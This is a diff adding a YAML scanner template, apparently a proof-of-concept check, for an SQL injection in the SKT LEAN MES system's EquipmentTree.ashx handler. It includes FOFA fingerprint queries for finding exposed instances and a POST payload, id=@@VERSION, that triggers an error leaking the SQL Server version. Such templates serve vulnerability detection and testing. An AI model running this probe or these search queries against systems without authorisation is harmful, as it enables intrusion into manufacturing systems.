@@ -1,0 +1,19 @@
+id: poc-yaml-skt-lean-mes-equipmenttree-sqli
+info:
+  name: 深科特 LEAN MES系统 EquipmentTree.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: lean-mes
+  fofa_1: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js"
+  fofa_2: body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+requests:
+- method: POST
+  path: /Handler/EquipmentTree.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: id=@@VERSION
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"[SqlException]:")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+variables: {}
+transport: http
